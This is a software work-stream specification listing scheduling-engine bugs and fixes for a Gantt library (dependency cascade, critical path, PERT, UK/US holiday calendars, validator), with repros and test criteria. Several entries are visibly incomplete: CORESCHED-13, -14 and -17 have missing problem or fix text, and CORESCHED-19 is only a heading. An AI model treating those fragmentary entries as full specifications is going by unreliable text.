## WS-11 · Core scheduling: resolver, CPM, PERT, calendar, validator, schema  (`coresched`)

- **Goal:** Make scheduling deterministic and lossless. One shared dependency graph drives the cascade, CPM, cycle guard and validator, so every FS/SS/FF/SF link, lag, calendar and holiday gives the same answer on every path. Bad input is reported instead of silently rewriting dates, and the schema, examples and docs match the engine.
- **Owned files (exclusive):**
  - `packages/core/src/{resolver,cpm,pert,calendar,date-math,dependencies,validator,utils,constants,types}.ts`
  - `packages/core/src/pipeline/**`: `contracts.ts`, `index.ts`, `schedule-pipeline.ts` and `stages/{sanitize,cycle-guard,cascade-resolve,critical-path}-stage.ts`
  - `packages/core/tests/{calendar,date-math,dependencies,integration,multi-deps-and-themes,resolver,schedule-pipeline,utils,validator}.test.ts`, plus the new `packages/core/tests/pert.test.ts` (`pm-analytics.test.ts` belongs to coreanalytics)
  - `schema/jantt.schema.json` is the source of truth. `apps/playground/public/schema/v1.json` must stay a byte-identical copy.
  - `examples/*.json`: 8 files, including the 3 `broken-*.json` fixtures
  - `docs/algorithms.md`, `docs/schema-spec.md`
- **Contracts:**
  - This WS implements two GitHub issues: ISSUES-01 (#61, UK/US substitute bank holidays, `calendar.ts`) and ISSUES-03 (the time-bomb today-line test in `integration.test.ts`). ISSUES-02 and ISSUES-04 belong to `buildci`.
  - `packages/core/src/index.ts` is owned by `coreinteract` and re-exports every module here with `export *`.
    - Every existing export keeps its name and signature.
    - New names are listed under Notes → Blocked so coreinteract can confirm there are no `export *` collisions. A collision silently drops the name from the public API.
  - `types.ts` is shared by all core modules. Changes are additive only: new optional fields, new union members, new optional result fields. Nothing is renamed or narrowed.
- **Exit criteria:**
  1. `npx tsc --noEmit -p packages/core/tsconfig.json` and `npm run build -w @jantt/core` pass. `Object.keys(await import("@jantt/core"))` diffed against HEAD shows additions only.
  2. `npm test -w @jantt/core` is green. This includes `resolver`, `dependencies`, `schedule-pipeline`, `calendar`, `validator`, `date-math`, `utils`, `integration` and the new `pert.test.ts`. It stays green on a second run with the system time faked to 2031-06-15 (`vi.setSystemTime` in a setup file), so no assertion depends on the wall clock.
  3. The seeded property suite in `resolver.test.ts` passes. It generates 500 plans mixing FS/SS/FF/SF, ± lags, milestones, locked tasks, reverse ordering, injected cycles, duplicate ids and dangling ids, and checks that:
     - `resolveSchedule` is idempotent.
     - Every link that is outside a cycle and has an unlocked successor satisfies `relationEarliestStartDay`.
     - `resolveSchedule` and `SchedulePipeline.createDefault().execute` produce identical dates.
     - `calculateCriticalPath` on the resolved plan gives `projectTotalFloat === 0`, and every critical task that has predecessors has at least one critical driving link.
  4. Holiday tables for UK/GB 2021, 2022, 2027, 2028 and 2033 and for US 2021–2028 match the gov.uk and OPM lists. This closes #61.
  5. Every `examples/*.json` passes `validate()` with zero errors, except that each `broken-*.json` yields exactly its documented code. `v1.json` equals `jantt.schema.json`.
  6. No performance regression:
     - With calendars off, a 10k-task reverse chain and a 30-stage ladder resolve and run the CPM no slower than HEAD (median of 5 runs, same machine).
     - With `region: "US"`, 100 `diffWorkingDays` calls over one year take < 150 ms (HEAD: 1.3 s).

### Tasks (severity order)

#### [ ] CORESCHED-01 · Dependency cycles push cyclic tasks months further out on every resolve, and the drift is saved  `critical` `data-loss` `effort M`
- **Where:** `packages/core/src/resolver.ts:74`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:51`, `packages/core/src/pipeline/stages/cycle-guard-stage.ts:62`, `packages/core/src/pipeline/schedule-pipeline.ts:74`, `packages/core/src/rendering/task-schedule-coordinator.ts:50`
- **Problem:**
  - `resolveSchedule` runs `CascadeResolveStage` with no cycle guard. The pipeline's `CycleGuardStage` only logs, because `breakCycles` defaults to false, so the cascade relaxes a cycle for all 24 passes.
  - Repro: A↔B, both 01-01..01-05. Three runs move A to 2026-10-10, then 2027-07-25, then 2028-05-08.
  - Every load, drag or edit of a cyclic plan (from an import, the JSON editor or an LLM) shifts those tasks about 9 months and saves the result. `TaskScheduleCoordinator` drops `.diagnostics`, so nobody is warned.
- **Fix:**
  - `CascadeResolveStage.process`:
    - Build `buildDependencyGraph(tasks)` once and relax tasks in `graph.order` in one pass (O(V+E)).
    - Skip any link where `graph.isCyclicEdge(pred, succ)`. Links into and out of a cycle are still honored.
    - Push one diagnostic per `graph.cycles` entry, naming its members.
  - `resolveSchedule(tasks, gapOrOptions)`: keep the numeric overload and also accept `ResolveScheduleOptions { defaultGapDays, autoCascade, diagnostics, calendar, useWorkingDays, calendars, people }`. A `diagnostics` array passed by the caller receives the warnings. Nothing is thrown.
  - Hand-off to `corerender`:
    - `jantt-engine.ts:80/678` and `TaskScheduleCoordinator` pass a diagnostics array.
    - Each distinct message is reported once through `options.onError`, de-duplicated per data load, so drags do not spam it.
- **Verify:**
  - `resolver.test.ts`, "is idempotent on cyclic plans", with A↔B plus C dependent on B:
    - `resolveSchedule(resolveSchedule(x))` deep-equals `resolveSchedule(x)`.
    - A and B keep their dates, and C still honors B.
    - Exactly one cycle diagnostic is emitted.
  - `schedule-pipeline.test.ts`: the same plan through `execute()` three times gives identical tasks each time.

#### [ ] CORESCHED-02 · The critical path uses a 0-day gap while the cascade inserts 2-day gaps, so predecessors are never critical  `high` `bug` `effort S`
- **Where:** `packages/core/src/cpm.ts:125`, `packages/core/src/layout.ts:190`, `packages/core/src/rendering/jantt-engine.ts:191`, `packages/core/src/constants.ts:19`, `packages/core/src/resource-leveler.ts:260`
- **Problem:**
  - `cpm.ts` uses `options?.defaultGapDays ?? 0` in every pass, while `resolveSchedule` defaults to `DEFAULT_GAP_DAYS = 2`. `layout()`, `jantt-engine.render` and the resource leveler call `calculateCriticalPath(tasks)` with no options.
  - Repro: after the cascade places B (FS on A, 01-01..01-05) at 01-07, the CPM gives A `totalFloat` 2, `criticalTaskIds = {B}` and `criticalDepKeys = {}`. Only the last task of each chain is highlighted, and no critical link is drawn.
  - BudgetKpiView passes `meta.defaultGapDays`, so it disagrees with the Gantt.
- **Fix:**
  - `calculateCriticalPath`: a missing or non-finite `defaultGapDays` falls back to `DEFAULT_GAP_DAYS`.
  - Compute each edge with the cascade's own functions: `resolveRelationLag(rel, getEffectiveGap(task, defaultGap))` and `relationEarliestStartDay`. The two then share one constraint formula and cannot drift.
  - Add `getScheduleOptions(data: JanttData): ResolveScheduleOptions` to `resolver.ts`. It returns `{ defaultGapDays: meta.defaultGapDays ?? DEFAULT_GAP_DAYS, calendar: meta.calendar, useWorkingDays: meta.useWorkingDays, calendars: data.calendars, people: data.people }` and is the single mapping from a plan to scheduling options. Six callers need it (engine, coordinator, controller, worker, mcp, BudgetKpiView).
  - `CriticalPathStage` already forwards `context.defaultGapDays`; keep it.
  - Hand-offs:
    - corerender: `layout.ts:264` and `jantt-engine.ts:382` pass `{ ...getScheduleOptions(data), targetDate: meta.targetDate }`.
    - coreanalytics: the resource leveler adds `targetDate` and the calendar options.
    - pgviews: BudgetKpiView uses the same object.
- **Verify:** add "CPM on cascaded data" to `resolver.test.ts`:
  - Run `resolveSchedule` on an A→B→C chain, then `calculateCriticalPath` with no options. All three tasks are critical, `criticalDepKeys` is `{A->B, B->C}` and every float is 0.
  - Repeat with `meta.defaultGapDays: 5` passed through `getScheduleOptions`; the result is the same.

#### [ ] CORESCHED-03 · The CPM ignores SS/FF/SF dependency types and per-link lags  `high` `backend-logic` `effort M`
- **Where:** `packages/core/src/cpm.ts:73`, `packages/core/src/cpm.ts:134`, `packages/core/src/cpm.ts:196`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:85`
- **Problem:**
  - Edges come from `getTaskDependencies`, which returns ids only. The forward pass uses `addDays(predEF, gap)` and the backward pass uses `addDays(succLS, -gap)` for every edge, so `rel.type` and `rel.lagDays` are never read. The cascade does honor them.
  - Repro: A 03-02..03-10 and B `"A:SS+0d"` gives ES_B = 03-10, treating the link as FS.
  - Early and late dates, both floats, driving predecessors, critical links and the critical set are all wrong for any plan that uses SS/FF/SF or a lead or lag.
- **Fix:** in `calculateCriticalPath`, read typed edges from `graph.predecessors` with `lag = resolveRelationLag(rel, gap)`, then:
  - **Forward pass:** use `relationEarliestStartDay(type, ES_p, EF_p, dur_s, lag)`:
    - FS: EF_p + lag
    - SS: ES_p + lag
    - FF: EF_p + lag − dur_s
    - SF: ES_p + lag − dur_s
  - **Backward pass:** use the mirror of each formula. `LF_p = min(...)` over successors of:
    - FS: LS_s − lag
    - SS: LS_s − lag + dur_p
    - FF: LF_s − lag
    - SF: LF_s − lag + dur_p
  - **Driving link:** `forwardCandidate(e) === ES_s`.
  - **Free float:** the minimum over edges of `succAnchorEarly − lag − ownAnchorEarly`, clamped to [0, TF].
  - Use integer epoch-day arrays (`Float64Array`) instead of string date math. The hot loop is then allocation-free, which is faster than HEAD.
- **Verify:** add a `describe("CPM dependency types")` block in `resolver.test.ts`:
  - One case per type with lag 0, +2 and −1. Assert ES, LF, TF and FF, and that `criticalDepKeys` contains the link when it drives.
  - Repro case: A 03-02..03-10 with B `"A:SS"` gives ES_B = 03-02.

#### [ ] CORESCHED-04 · A zero lag cannot be expressed: SS/FF/SF links and explicit +0 lags all get the 2-day default gap  `high` `backend-logic` `effort S`
- **Where:** `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:81`, `packages/core/src/dependencies.ts:52`
- **Problem:**
  - `const lag = rel.lagDays !== 0 ? rel.lagDays : defaultGap`, and `parseDependencyRelation` returns `lagDays: 0` both when no lag is given and for `"A:FS+0"` or `{lag:0}`.
  - Repro with gap 2: `"A:SS"` starts at A.start + 2, `{id:"A",type:"FS",lag:0}` starts at A.end + 2, and a bare FF forces the successor to finish 2 days after A.
  - SS and FF links, the most common non-FS types, are silently offset, and the user cannot remove the offset with an explicit 0.
- **Fix:**
  - Keep the public `DependencyRelation.lagDays: number`. Changing it to `number | undefined` would break typed consumers (coresync hashing, interop).
  - Add an optional `explicitLag?: true`, set by `makeRelation` whenever a lag token or a `lag`/`lagDays` field is present.
  - `resolveRelationLag(rel, gapDays)`:
    - An explicit lag (or any non-zero `lagDays` on a hand-built relation) wins.
    - Otherwise FS uses the task or project gap, and SS/FF/SF use 0.
  - The cascade, the CPM (CORESCHED-03) and the validator (CORESCHED-30) call only this function.
- **Verify:** `dependencies.test.ts` and `resolver.test.ts`, with A 03-02..03-10 and gap 2:

  | Link | Expected successor |
  |---|---|
  | `"A:SS"` | B.start = 03-02 |
  | `"A:FS+0"` | B.start = 03-10 |
  | `{id:"A",type:"FS",lag:0}` | B.start = 03-10 |
  | `"A:FF"` | B.end = 03-10 |
  | `"A"` | B.start = 03-12 |

  Parse results carry `explicitLag` only when a lag was written.

#### [ ] CORESCHED-05 · Duplicate task IDs make the cascade replace one task's data with the other's  `high` `data-loss` `effort S`
- **Where:** `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:37`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:141`, `packages/core/src/rendering/jantt-engine.ts:56`
- **Problem:**
  - `byId` is keyed by id and the result is `tasks.map((orig) => byId[orig.id] || {...orig})`, so every duplicate becomes a copy of the last one.
  - The engine resolves on load whether or not the data validated.
  - Repro: two tasks with id `"A"`, labelled "first" and "second", come back as two copies of "second". The next commit saves the loss of one task's label, dates, notes and fields.
- **Fix:**
  - `buildDependencyGraph` keeps the first occurrence in `nodes` and lists the rest in `duplicateIds`.
  - The cascade returns later copies as an untouched `cloneTask(orig)`, decided by identity (`graph.nodes.get(orig.id) === orig`), and pushes one diagnostic. The CPM and PERT also read only `graph.nodes`.
  - Add `dedupeTaskIds(tasks): { tasks, renamed: { from: string; to: string }[] }` to `utils.ts`:
    - It renames later copies to `${id}~2`, `~3` and so on, skipping ids already in use.
    - It never rewrites `dependsOn`, so existing links keep pointing at the first task.
    - It returns the input array unchanged when there are no duplicates, so the common case allocates nothing.
  - The validator keeps its `DUPLICATE_TASK_ID` error.
  - Hand-offs: corerender (engine load), pgstate (import/paste) and tools (mcp) call `dedupeTaskIds` before the first resolve and show `renamed` (toast or `onError`).
- **Verify:**
  - `resolver.test.ts`: with the two "A" tasks, both labels survive, the second task's dates are unchanged and one duplicate diagnostic is emitted.
  - `utils.test.ts`: `dedupeTaskIds` with `[A, A, A~2]` renames to `A~3`, and an input without duplicates is returned as the same reference.

#### [ ] CORESCHED-06 · Critical-path enumeration grows exponentially, recurses forever on cycles, and reads undefined dates for cycle nodes  `high` `performance` `effort M`
- **Where:** `packages/core/src/cpm.ts:326`, `packages/core/src/cpm.ts:193`, `packages/core/src/rendering/jantt-engine.ts:191`
- **Problem:**
  - `tracePath` materializes every critical path recursively, with no visited set and no cap, and `render()` calls it on every frame.
  - With two equal parallel tasks per stage, 18 stages give 262,144 paths in 93 ms, and each added stage doubles that, so about 25 stages run out of memory.
  - The cyclic input `C; A dep [B,C]; B dep A` (zero-length tasks) throws "Maximum call stack size exceeded".
  - Cycle nodes read `lateStartMap.get(sId)!` as undefined at `:193`, so their floats are garbage.
- **Fix:**
  - `criticalTaskIds` and `criticalDepKeys` are computed independently of path listing and stay complete.
  - Enumerate paths with an iterative DFS over the `criticalNext` adjacency. Cyclic edges are excluded upstream, so this graph is a DAG.
  - Cap the listing at the exported `MAX_CRITICAL_PATHS = 100`. When the cap is hit, add a `CriticalPathResult.warnings` entry ("listing truncated"). Total work is bounded by roughly cap × depth.
  - Cycle nodes stay in `graph.order`, a total order over the SCC condensation, with their cyclic edges dropped, so every metric is finite. A warning names each cycle.
- **Verify:** `resolver.test.ts`:
  - Ladder: 30 stages × 2 equal tasks, fully linked. It returns in < 200 ms with all 60 tasks critical, `criticalPaths.length === 100` and the truncation warning.
  - Cyclic repro: no throw, every `metrics` value is a finite number, and there is a cycle warning.

#### [ ] CORESCHED-07 · Removing or adding a dependency rewrites dependsOn as bare IDs, which drops SS/FF/SF types and lags  `high` `data-loss` `effort S`
- **Where:** `packages/core/src/pipeline/stages/sanitize-stage.ts:36`, `packages/core/src/controller/strategies/link-gesture.ts:30`, `packages/core/src/rendering/task-schedule-coordinator.ts:62`
- **Problem:**
  - Whenever one link is filtered out, `SanitizeStage` rebuilds `dependsOn` from `getTaskDependencies`, which returns ids only.
  - Repro: B `["A:SS+1d","ghost"]` becomes `"A"` (FS), and B moves from 03-03 to 03-10. C `[{id:"A",type:"FF",lag:3},"C"]` becomes `"A"`.
  - The link gesture (`["A:SS+2d"]` becomes `["A","C"]`) and `deleteTask` do the same, silently converting typed links to FS.
- **Fix:** add two helpers to `dependencies.ts`:
  - `filterDependsOn(dependsOn, keep, knownIds?)` filters the raw items and keeps every kept string or object exactly as written. It returns:
    - the original reference when nothing is removed
    - `null` when no link remains
    - the single item when one remains
    - otherwise an array, or a comma-joined string when the input was a string
  - `appendDependency(dependsOn, item)` appends one item and keeps the rest untouched.
  - Use them in `SanitizeStage` and in `CycleGuardStage` (CORESCHED-17).
  - Hand-offs: coreinteract `link-gesture.ts` uses `appendDependency`. corerender `TaskScheduleCoordinator.deleteTask/removeDependency` uses `filterDependsOn`. coresync depends on these names: keep `filterDependsOn`, `getTaskDependencyRelations` and `getDependsOnItems` stable.
- **Verify:**
  - `schedule-pipeline.test.ts`: B `["A:SS+1d","ghost"]` sanitizes to `"A:SS+1d"` and keeps 03-03. C `[{id:"A",type:"FF",lag:3},"C"]` sanitizes to `{id:"A",type:"FF",lag:3}`. An untouched `dependsOn` keeps its reference (`toBe`).
  - `dependencies.test.ts`: cover `appendDependency` on null, a string, an array and an object.

#### [ ] CORESCHED-08 · End-date convention is inconsistent: rendering treats end as inclusive, scheduling treats end minus start as the duration  `high` `inconsistency` `effort L`
- **Where:** `packages/core/src/date-math.ts:103`, `packages/core/src/layout.ts:203`, `packages/core/src/cpm.ts:67`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:75`, `packages/core/src/pert.ts:107`, `schema/jantt.schema.json:209`
- **Problem:**
  - `taskDurationDays` returns diff + 1, and bars are drawn through the end day. The cascade, the CPM, PERT and the exporter use `end − start`, and `start === end` counts as a milestone (`layout.ts:203`, `pert.ts:107`).
  - So a 1-day task cannot exist: it renders as a diamond and PERT counts it as 0 days.
  - The schema calls `end` "inclusive / exclusive range". FS semantics are undocumented: FS+0 overlaps the predecessor's last day, and gap 2 leaves one free day.
- **Fix:** decision D1 (see Notes): keep the stored meaning of lags and gaps, and make inclusive end dates explicit everywhere. No saved plan moves on upgrade.
  - **Convention.** Write it once in the `date-math.ts` header, the schema, `schema-spec.md` and `algorithms.md`:
    - `start` and `end` are inclusive dates. A non-milestone task with `start === end` is a 1-day task.
    - Only `milestone: true` makes a milestone, and its end is forced to its start.
    - User-facing duration is `taskDurationDays(start, end, milestone)` = end − start + 1 (0 for milestones).
    - A lag is the offset between the two anchor dates:
      - FS: succ.start ≥ pred.end + lag
      - SS: succ.start ≥ pred.start + lag
      - FF: succ.end ≥ pred.end + lag
      - SF: succ.end ≥ pred.start + lag
    - So FS+1 means the next day, FS+0 is a same-day hand-off (like SS+0 and FF+0), and the default gap of 2 leaves one free day between bars.
  - **Code.**
    - Add `taskSpanDays(task)` to `date-math.ts`: `milestone ? 0 : max(0, toEpochDay(end) − toEpochDay(start))`, or NaN when a date is invalid.
    - The cascade (`durationDays`) and the CPM (`dur[i]`) call it instead of their local copies.
  - **PERT.** `plannedDurationDays` switches to inclusive `taskDurationDays`, so a 1-day task has M = 1 and a non-zero variance. CORESCHED-23's Σ(E − D) delta stays consistent in units.
  - **Hand-offs:**
    - corerender: `layout.ts:304` uses `isMilestone = task.milestone === true`.
    - coreinteract: the exporter uses `taskDurationDays` with the milestone flag only. MS Project/XML export converts the lag as MSP `FS+N` = Jantt `FS+(N+1)`.
    - interop: importers apply the inverse.
- **Verify:**
  - `date-math.test.ts`: a table for `taskSpanDays` and `taskDurationDays`, covering a 1-day task, a milestone, inverted dates and invalid dates.
  - `resolver.test.ts`: a non-milestone task with `start === end` keeps span 0, and its FS successor lands on end + 2.
  - `pert.test.ts`: a single 1-day task has expected duration 1 and σ > 0.
  - corerender's `layout.test.ts`: a 1-day bar has width = dayWidth.

#### [ ] ISSUES-01 · GitHub #61: UK/GB substitute bank holidays are wrong when Christmas or New Year falls on a weekend, and the US observed New Year leaks into the previous year  `high` `bug` `effort M`
- **Where:** `packages/core/src/calendar.ts:126`, `packages/core/src/calendar.ts:143`, `packages/core/src/calendar.ts:159`, `packages/core/src/calendar.ts:169`, `packages/core/src/calendar.ts:226`, `packages/core/tests/calendar.test.ts`
- **Problem:**
  - `observedDate()` applies the US Saturday→Friday rule to UK New Year, so 2022 gives 2021-12-31 instead of Monday 2022-01-03.
  - UK Christmas on a Saturday gives 12-28/12-29 instead of Mon 12-27 / Tue 12-28. On a Sunday it gives 12-27/12-28 instead of Mon 12-26 / Tue 12-27.
  - `getDayStatus` only checks the queried year, so `isWorkingDay('2027-12-31', {region:'US'})` is true. Dependent tasks land on bank holidays and real working days are skipped around year-end.
- **Fix:**
  - Add one seed-plus-rule engine, `observeHolidays(seeds, rule, suffix)`:
    - `"next"` (UK/GB, CA, AU): move a weekend holiday to the next weekday that is not already a holiday. Seeds are applied in date order, so Christmas then Boxing Day resolves to Mon 27 + Tue 28 (Saturday Christmas) or Mon 26 + Tue 27 (Sunday Christmas). New Year moves to the next Monday.
    - `"nearest"` (US federal): Saturday→Friday, Sunday→Monday.
  - `statutoryHolidaysFor(region, year)` generates the observed lists for year − 1, year and year + 1, keeps the entries whose observed date falls in `year`, and memoizes per `region|year` (bounded map). Cross-year observed days are then included.
  - Close #61 in the PR description.
- **Verify:** `calendar.test.ts`, "Weekend substitute days (GitHub #61)":
  - Table-driven checks against gov.uk for 2021, 2022, 2027, 2028 and 2033, and against OPM for US 2021–2028.
  - `isWorkingDay("2027-12-31", {region:"US"}) === false`, and `"2022-01-03"` and `"2022-12-27"` are non-working for the UK.

#### [ ] CORESCHED-11 · The dependency shorthand parser misreads real IDs that end in -<number>d and rejects typed syntax for IDs with other characters  `medium` `bug` `effort S`
- **Where:** `packages/core/src/dependencies.ts:57`, `packages/core/src/dependencies.ts:48`
- **Problem:**
  - The offset regex runs before the plain-id fallback, so `"model-3d"` parses as `{id:"model", lag:-3}` and `"build-10days"` as id `"build"`.
  - Ids with spaces, Unicode or `@` cannot use typed syntax: `"Phase 1:SS"` stays a literal id.
  - Pattern 1 accepts `day` and pattern 2 does not, so `"t1+2day"` becomes an id.
  - Valid ids silently become dangling links with leads.
- **Fix:**
  - `inspectDependencyItem(item, knownIds?: TaskIdLookup)`:
    - An exact `knownIds.has(trimmed)` match returns a plain FS id first.
    - Typed syntax `^(.+?)\s*:\s*(FS|SS|FF|SF)(?:\s*([+-]\d+)\s*(?:d|days?)?)?$/i` accepts any characters in the id.
    - The offset form requires a unit (`d|day|days`).
    - A string containing `:` that is not valid typed syntax is kept as a plain id, with an `issue` for the validator.
  - `getTaskDependencyRelations(task, knownIds?)` threads the lookup through, and `buildDependencyGraph` passes `nodes`.
  - Hand-off: renderers, sidebar, exporter and interop pass `knownIds` wherever they already hold the id set. Without it, behaviour is unchanged.
- **Verify:** `dependencies.test.ts`:
  - With known ids `{"model-3d","build-10days"}`, both parse as plain ids. Without them, the legacy parse is kept.
  - `"Phase 1:SS"` gives `{id:"Phase 1", type:"SS"}`.
  - `"t1+2day"` gives `{id:"t1", lag 2}`.

#### [ ] CORESCHED-12 · Dependency lag values and types are never validated: NaN, huge or fractional lags and unknown types are silently accepted  `medium` `error-handling` `effort S`
- **Where:** `packages/core/src/dependencies.ts:82`, `packages/core/src/validator.ts:196`, `packages/core/src/date-math.ts:84`
- **Problem:**
  - Any number is accepted as a lag, and an unknown type silently becomes FS. The validator only checks ids.
  - `{id:"A",lag:1e9}` makes `addDays` return `"NaN-NaN-NaN"`, which `diffDays` reads back as 2026-01-01. The constraint is ignored and `validate()` passes.
  - `"A:FS+99999999d"`, `{type:"XX"}` and `dependsOn: 5` are also accepted without a diagnostic.
- **Fix:**
  - `sanitizeLag(raw)`:
    - A non-finite lag is ignored, with an issue.
    - A lag is rounded to an integer and clamped to ±`MAX_DEPENDENCY_LAG_DAYS` (3650), with an issue.
    - A non-number lag is ignored, with an issue.
    - An unknown object `type` is treated as FS, with an issue.
  - `inspectDependencyItem` returns `{ relation, issue }`. `parseDependencyRelation` stays a thin wrapper with the same signature.
  - The validator walks `getDependsOnItems(task.dependsOn)` through `inspectDependencyItem` and emits `INVALID_DEPENDENCY`:
    - **Error:** the shape is not a string, array or object, or an object has no non-empty string `id`.
    - **Warning:** the lag was clamped or ignored, or the type was unknown. The engine tolerates these, so legacy plans still load.
- **Verify:**
  - `validator.test.ts`: each of `{lag:1e9}`, `"A:FS+99999999d"`, `{type:"XX"}`, `dependsOn: 5` and `{lag:"2"}` produces `INVALID_DEPENDENCY` at the expected severity.
  - `resolver.test.ts`: `{lag:1e9}` yields a real date of A.end + 3650.

#### [ ] CORESCHED-13 · Working calendars (meta.calendar, useWorkingDays, data.calendars, person calendars) never reach the cascade  `medium` `false-logic` `effort M`
- **Where:** `packages/core/src/resolver.ts:75`, `packages/core/src/pipeline/schedule-pipeline.ts:69`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:34`, `packages/core/src/types.ts:27`, `packages/core/src/calendar.ts:456`
- **Problem:**

    - Resolve each task's calendar once with `resolveTaskCalendar`, only when a calendar applies. The integer fast path stays when none does.
    - The forward pass uses `relationEarliestStartWorking`, and the backward pass mirrors it with `addWorkingDays(anchor, −lag, cal)`.
    - Total and free float are reported in working days (`diffWorkingDays(ES, LS, cal)`).
  - The validator's `DEP_TIMING_CONFLICT` check (CORESCHED-30) uses the same working candidate when a calendar applies, so it does not raise false warnings for leads.
  - Every caller builds its options with `getScheduleOptions(data)` (CORESCHED-02). Hand-offs:
    - corerender: engine `:80/:678/:382`, coordinator
    - coreinteract: controller (already passes the calendar), move/resize gestures, worker
    - tools: mcp
    - pgviews: BudgetKpiView
- **Verify:**
  - `calendar.test.ts`, "CascadeResolveStage Calendar Integration", via `resolveSchedule(tasks, getScheduleOptions(plan))`: a predecessor ending Friday puts its FS successor on Tuesday (gap 2 working days). A person calendar is resolved through the assignee.
  - `resolver.test.ts`: the CPM of the same plan keeps the chain critical with `totalFloat` 0 across the weekend.

#### [ ] CORESCHED-14 · An empty or misspelled workingDays list moves tasks about 14 years into the future  `medium` `bug` `effort S`
- **Where:** `packages/core/src/calendar.ts:216`, `packages/core/src/calendar.ts:346`, `packages/core/src/calendar.ts:282`
- **Problem:**
  - `createCalendar` keeps `workingDays: []` and string arrays as given, and `isWorkingDay` uses `includes(dayOfWeek)`.
  - `addWorkingDays` stops after `MAX_STEPS = 5000` and returns wherever it got to. Both `addWorkingDays("2026-01-05", 3, {workingDays: []})` and the `["Mon","Tue",…]` form return 2039-09-14.

  - `normalizeWorkingDays(raw)`:
    - Keeps integers 0–6 and maps names (`"Mon"`, `"monday"`, case-insensitive) to numbers, returning them sorted and unique.

  - `addWorkingDays`: bound the loop by `|days| × 7 + 366` steps. When it is exhausted (no working day at all, for example every day is an exception), return the plain calendar-day result `start + days`. It never drifts years ahead.
  - The validator emits `INVALID_CALENDAR` warnings for `meta.calendar`, `calendars[*]`, `person.calendar` and `team.calendar`. It checks for: bad `workingDays`, holiday dates that fail `isStrictISODate`, an exception without a boolean `isWorkingDay`, and an unknown region (`isSupportedRegion`).
- **Verify:**
  - `calendar.test.ts`, "Calendar sanitization and guards":
    - Both repro calls return 2026-01-08.
    - An all-exception calendar returns `start + days`.
    - `["mon","Tue","WEDNESDAY"]` normalizes to `[1,2,3]`.
  - `validator.test.ts`: covers each warning.

#### [ ] CORESCHED-16 · Working-day arithmetic regenerates statutory holidays and re-clones the calendar for every day it checks  `medium` `performance` `effort M`
- **Where:** `packages/core/src/calendar.ts:268`, `packages/core/src/calendar.ts:250`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:74`
- **Problem:**
  - `isWorkingDay` calls `createCalendar(calendar)` (copying workingDays, holidays and exceptions) for every day checked. `getDayStatus` rebuilds the region's holiday list, including its `getNthWeekdayOfMonth` loops, on every call.
  - Measured: 100 `diffWorkingDays` calls over a year with region US take 1.3 s.
  - The cascade makes 1–3 such calls per task, and `move-gesture.ts:47` resolves on every pointermove, so dragging crawls once calendars are on.
- **Fix:**
  - `getCalendarIndex(calendar)` compiles each calendar object once into `{ workingWeekdays: boolean[7], holidays: Set<epochDay>, exceptions: Map<epochDay, boolean>, region }`.
    - The index is cached in a `WeakMap` keyed by the object.
    - It is rebuilt when the object's `workingDays`, `holidays`, `exceptions` or `region` reference changes.
    - Presets are resolved to their constant objects, so they hit the cache.
  - Memoize statutory days per `region|year` as a `Set<epochDay>` (bounded memo).
  - `isWorkingDay`, `addWorkingDays` and `diffWorkingDays` work on integer epoch days with no cloning and no string formatting inside the loop.
  - The cascade resolves each task's calendar once per resolve, outside the link loop.
  - Replace the O(span) loop in `diffWorkingDays` with an O(1) full-weeks formula only if profiling after this change still shows it as hot.
- **Verify:** `calendar.test.ts`, "keeps working-day arithmetic fast with regional holidays": 100 calls over one year with region US take < 150 ms (CI-safe; at least 8× faster than HEAD). "Re-indexes a calendar whose holiday list is replaced" checks cache invalidation.

#### [ ] CORESCHED-17 · The breakCycles option removes the dependencies of every task downstream of a cycle, not just the cycle's edges  `medium` `data-loss` `effort M`
- **Where:** `packages/core/src/pipeline/stages/cycle-guard-stage.ts:62`
- **Problem:**

  - Repro: an A/B cycle plus C dep B, D dep C and F dep [E, C]. A, B, C, D and F all lose their dependencies, so F also loses its valid link to E.

  - Without `breakCycles` it only reports, one entry per SCC and per self reference.
- **Verify:** `schedule-pipeline.test.ts`, "breakCycles removes only links inside the cycle":
  - With the repro plan, only the A↔B links go.
  - C, D and F keep their `dependsOn` reference unchanged.
  - The diagnostics name the removed links.

#### [ ] CORESCHED-19 · Duplicate task IDs are reported as a dependency cycle, which blocks every new link  `medium` `bug` `effort S`

#### [ ] CORESCHED-20 · Validator cycle detection reports false cycles, crashes on null task entries and overflows the stack on long chains  `medium` `bug` `effort M`
- **Where:** `packages/core/src/validator.ts:249`, `packages/core/src/validator.ts:243`, `packages/core/src/validator.ts:199`
- **Problem:**
  - `checkCycle` returns true without clearing `recStack`/`pathAcc`, so with A↔B plus C dep A it also reports `C -> A`.
  - A self dependency yields two errors.
  - `data.tasks!.findIndex(t => t.id === currId)` throws a TypeError when `tasks` contains `null`.
  - The recursive DFS overflows on a reverse chain of about 6000 tasks.
  - `validate()` can throw instead of returning errors, and users or LLMs are told to break cycles that do not exist.
- **Fix:**
  - Replace `checkCycle` with `buildDependencyGraph(data.tasks)` (iterative Tarjan).
  - Emit one `CIRCULAR_DEPENDENCY` per SCC. Its message lists one concrete loop, found by an iterative `findDependencyLoop(members, predecessors)` restricted to the SCC, and its suggestion names the link to remove.
  - Self loops are reported once, by the per-task check.
  - Build an `idToIndex` Map in the first pass, skipping `null` and non-object entries everywhere. This removes the `findIndex` calls.
- **Verify:** `validator.test.ts`:
  - A↔B plus C dep A gives exactly 1 cycle error and none naming C.
  - A self dependency gives exactly 1 error.
  - `tasks: [null, …]` returns errors and does not throw.
  - A 6000-task reverse chain with a back-edge gives 1 error and no `RangeError`.

#### [ ] CORESCHED-21 · The validator accepts input the schema rejects and leaves many fields unchecked  `medium` `inconsistency` `effort M`
- **Where:** `packages/core/src/validator.ts:102`, `packages/core/src/validator.ts:157`, `packages/core/src/date-math.ts:28`
- **Problem:**
  - `isValidISODate` splits at `T` and trims, so `"2026-01-01T99:99garbage"` and `" 2026-01-01"` pass, though the schema rejects both. `progress: NaN` also passes.
  - None of these are checked: `gapDays`/`minGapDays`, the meta dates, category `label`/`color`, people/teams `id`/`name`, the `documents.status` enum, calendars, the `milestone`/`locked` types and the `dependsOn` shape.
